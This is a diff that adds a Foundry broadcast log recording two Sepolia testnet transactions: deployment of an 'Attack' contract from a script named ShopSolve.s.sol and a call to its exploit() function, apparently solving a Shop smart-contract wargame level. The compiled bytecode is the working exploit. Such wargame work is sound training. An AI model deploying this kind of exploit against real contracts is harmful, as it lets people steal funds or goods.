@@ -1,0 +1,54 @@
+{
+  "transactions": [
+    {
+      "hash": "0x1097869d5d1b73bcd29344c57fbceca4eec06fbf86eb00c39b3f2b98ad5a5054",
+      "transactionType": "CREATE",
+      "contractName": null,
+      "contractAddress": "0x43508ce22bAa2bf4BA1a990A3E41D343076d7b44",
+      "function": null,
+      "arguments": null,
+      "transaction": {
+        "type": "0x02",
+        "from": "0x699bceebd59a5b52bb586c737cd7ba636f3fe602",
+        "gas": "0x2b291",
+        "value": "0x0",
+        "data": "0x6080604052600080546001600160a01b0319167339ca928ef317d3ccb6dbf6492221ad4efc21442f17905534801561003657600080fd5b50610115806100466000396000f3fe6080604052348015600f57600080fd5b5060043610603c5760003560e01c80630881fa0d14604157806363d9b770146070578063a035b1fe146078575b600080fd5b6000546053906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b60766086565b005b604051606481526020016067565b6000805460408051635379571d60e11b815290516001600160a01b039092169263a6f2ae3a9260048084019382900301818387803b15801560c657600080fd5b505af115801560d9573d6000803e3d6000fd5b5050505056fea264697066735822122039eb3e7f8a699958de9d7b25df13a1842f551b020a9b3d52c4b9edff06dc384464736f6c63430008160033",
+        "nonce": "0xa2",
+        "accessList": []
+      },
+      "additionalContracts": [],
+      "isFixedGasLimit": false
+    },
+    {
+      "hash": "0x7f68f0bfaf8c0748145c74cb7b924e33325dad3924b98d9da7e2820c1bd750c0",
+      "transactionType": "CALL",
+      "contractName": "script/ShopSolve.s.sol:Attack",
+      "contractAddress": "0x43508ce22bAa2bf4BA1a990A3E41D343076d7b44",
+      "function": "exploit()",
+      "arguments": [],
+      "transaction": {
+        "type": "0x02",
+        "from": "0x699bceebd59a5b52bb586c737cd7ba636f3fe602",
+        "to": "0x43508ce22baa2bf4ba1a990a3e41d343076d7b44",
+        "gas": "0x11816",
+        "value": "0x0",
+        "data": "0x63d9b770",
+        "nonce": "0xa3",
+        "accessList": []
+      },
+      "additionalContracts": [],
+      "isFixedGasLimit": false
+    }
+  ],
+  "receipts": [],
+  "libraries": [],
+  "pending": [
+    "0x1097869d5d1b73bcd29344c57fbceca4eec06fbf86eb00c39b3f2b98ad5a5054",
+    "0x7f68f0bfaf8c0748145c74cb7b924e33325dad3924b98d9da7e2820c1bd750c0"
+  ],
+  "returns": {},
+  "timestamp": 1701969721,
+  "chain": 11155111,
+  "multi": false,
+  "commit": "9da6ebb"
+}
